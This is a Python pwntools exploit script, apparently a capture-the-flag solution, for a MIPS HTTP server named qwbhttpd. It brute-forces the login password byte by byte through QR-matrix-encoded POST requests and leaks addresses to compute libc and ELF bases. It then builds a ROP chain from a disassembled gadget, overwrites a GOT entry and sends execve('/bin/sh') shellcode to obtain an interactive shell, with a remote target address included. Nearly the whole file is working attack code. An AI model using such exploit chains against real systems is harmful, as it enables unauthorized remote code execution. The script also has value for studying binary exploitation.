from pwn import *
import sys
import qrcode

if len(sys.argv) == 2 and sys.argv[1] == "debug":
    p = process(["qemu-mips", "-g", "1234", "--singlestep", "-L", "./", "./qwbhttpd"])
elif len(sys.argv) == 2 and sys.argv[1] == "remote":
    p = remote("172.20.5.22", 11258)
    #p = remote("127.0.0.1", 2333)
else:
    p = process(["qemu-mips", "-L", "./", "./qwbhttpd"])

context.log_level = "debug"
context.arch = "mips"
context.endian = "big"

def get_qr_matrix(data:bytes):
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=1,
        border=0,
    )
    qr.add_data(data)
    qr.make(fit=True)
    qr.print_ascii()
    #print(dir(qr))
    raw_matrix = qr.get_matrix()

    return raw_matrix

def matrix_serialize(qr_matrix):
    res = b""
    for i in qr_matrix:
        for j in i:
            num = b"1" if j==True else b"0"
            res += num + b" "

    return res

def burp_pass(pad):
    req = b"POST /login.html HTTP/1.1\r\n"
    matrix = get_qr_matrix(pad.ljust(0x20, b"\x01"))
    wwidth = len(matrix)
    data = matrix_serialize(matrix)
    req += b"Content-Length: " + str(wwidth*wwidth*2).encode() + b"\r\n"
    req += b"Content-WWidth: " + str(wwidth).encode() + b"\r\n"
    req += b"\r\n"
    req += data
    print("Data length:", len(data))
    p.send(req)

def login(passwd):
    req = b"POST /login.html HTTP/1.1\r\n"
    matrix = get_qr_matrix(passwd)
    wwidth = len(matrix)
    data = matrix_serialize(matrix)
    req += b"Content-Length: " + str(wwidth*wwidth*2).encode() + b"\r\n"
    req += b"Content-WWidth: " + str(wwidth).encode() + b"\r\n"
    req += b"\r\n"
    req += data
    print("Data length:", len(data))
    p.send(req)

# hex(0 & 0xffffff | (-(ord("A")-0x51) & 0xff) << 0x18 )

def encode(data=b""):
    req = b"GET /encode.html?info="+ data + b" HTTP/1.1\r\n"
    req += b"\r\n"

    p.send(req)

def get_index():
    req = b"GET /index.html HTTP/1.1\r\n"
    req += b"\r\n"
    p.send(req)    

def vuln(data=b""):
    req = b"GET /encode.html?info=1&info=" + data + b" HTTP/1.1\r\n"
    req += b"\r\n"

    p.send(req)

def trigger_malloc(wwidth):
    req = b"POST /login.html HTTP/1.1\r\n"
    req += b"Content-Length: " + str(wwidth*wwidth*2).encode() + b"\r\n"
    req += b"Content-WWidth: " + str(wwidth).encode() + b"\r\n"
    req += b"\r\n"
    req += b"1 "*wwidth*wwidth
    p.send(req)    

def leave_value(passwd, value):
    req = b"POST /login.html HTTP/1.1\r\n"
    matrix = get_qr_matrix(passwd)
    wwidth = len(matrix)
    data = matrix_serialize(matrix)
    req += b"Content-Length: " + str(wwidth*wwidth*2).encode() + b"\r\n"
    req += b"Content-WWidth: " + str(wwidth).encode() + b"\r\n"
    req += b"AA: " + value + b"\r\n"
    req += b"\r\n"
    req += data
    #print("Data length:", len(data))
    p.send(req)

def calc_addr(raw_addr):
    def get_idx_num(num:int, idx:int):
        return (num >> ((7-idx)*4)) & 0xf
    num = 0
    num += ((raw_addr&0x0ffffff0)<<4) + get_idx_num(raw_addr, 0)
    print(hex(num))
    return num

def exp():
    # burp_password
    passwd = b""
    for i in range(8):
        burp_pass(passwd)
        p.recvuntil(b"Wrong password: ")
        p.recv(32)
        leak_byte = p.recv(1)
        passwd += bytes([0x1+u8(leak_byte)])
        print("Curr passwd:", passwd.hex(" "))

    # login
    login(passwd)
    # calc base
    leak_addr = u32(passwd[4:])
    elf_base = leak_addr - 0x19d60
    libc_base = elf_base - 0x8d3000
    print("leak_addr:", hex(leak_addr))
    print("libc_base:", hex(libc_base))
    print("elf_base:", hex(elf_base))

    # local
    # base: 0x7ffe6000
    # libc: 0x7f713000
    '''
    .text:000083F0                 sll     $v0, 1
    .text:000083F4                 lw      $v1, 0x24($sp)
    .text:000083F8                 lw      $ra, 0x4C($sp)
    .text:000083FC                 lw      $fp, 0x48($sp)
    .text:00008400                 lw      $s7, 0x44($sp)
    .text:00008404                 lw      $s6, 0x40($sp)
    .text:00008408                 lw      $s5, 0x3C($sp)
    .text:0000840C                 lw      $s4, 0x38($sp)
    .text:00008410                 addu    $v0, $v1, $v0
    .text:00008414                 lw      $s3, 0x34($sp)
    .text:00008418                 lw      $s2, 0x30($sp)
    .text:0000841C                 lw      $s1, 0x2C($sp)
    .text:00008420                 lw      $s0, 0x28($sp)
    .text:00008424                 jr      $ra
    '''
    gadget1 = elf_base+0x83F0

    write_got = elf_base+0x199DC
    target = elf_base+0x1170 # read write
    gp_val = 0x80007870 + (elf_base - 0x7ffe6000)
    
    # build ROP
    req = b"POST /login.html HTTP/1.1\r\n"
    matrix = get_qr_matrix(passwd)
    wwidth = len(matrix)
    data = matrix_serialize(matrix)
    req += b"Content-Length: " + str(wwidth*wwidth*2).encode() + b"\r\n"
    req += b"Content-WWidth: " + str(wwidth).encode() + b"\r\n"
    req += b"AAAAAAAA: AAAAAA"
    f = {
        0x28-0x28: p32(write_got) + p32(0),# s0:write_got s1:0
        0x4c-0x28: p32(target), # ra -> target
        0x28+0x10:(gp_val), # gp
    }
    rop = fit(f)
    req += rop + b"\r\n"
    req += b"\r\n"
    req += data
    p.send(req)

    print("gadget1:", hex(gadget1))
    vuln(p32(calc_addr(gadget1))*0x30)
    shellcode = asm('''
            xor $a0, $a0
            xor $a1, $a1
            xor $a2, $a2
            xor $v0, $v0
            bal exec
            nop
            .string "/bin/sh"
        exec:
            move $a0, $ra
            li $v0, 0xFAB
            syscall
            nop
    ''')
    p.send(p32(write_got+4) + shellcode)

    p.interactive()
    

if __name__ == "__main__":
    exp()
